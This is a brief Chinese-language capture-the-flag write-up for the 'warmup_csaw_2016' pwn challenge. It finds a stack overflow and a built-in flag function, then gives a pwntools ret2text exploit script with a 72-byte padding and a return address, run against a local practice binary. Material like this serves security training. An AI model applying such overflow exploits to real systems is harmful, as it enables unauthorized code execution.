---
title: "warmup_csaw_2016"
description: ""
date: 2023-03-30T22:51:11+08:00
lastmod: 2023-03-30T22:51:11+08:00
draft: false
images: []
type: docs
weight: 999
toc: true
---

## 0x01 分析

![09d4eedd8bf2501793e6ea0160f22923](images/09d4eedd8bf2501793e6ea0160f22923.png)  

存在溢出点，而且程序里有直接获取flag的函数

![b7018d5d4dd90f510226659cb7e99754](images/b7018d5d4dd90f510226659cb7e99754.png)  

直接简单的ret2text即可拿到flag

## Exploit

```python
from pwn import*
o = process("./pwn")
payload = b'a'*72 + p64(0x40060D)
o.sendline(payload)
o.interactive()
```

![cdba4d8aa3119cfd352b0c47a064d02f](images/cdba4d8aa3119cfd352b0c47a064d02f.png)
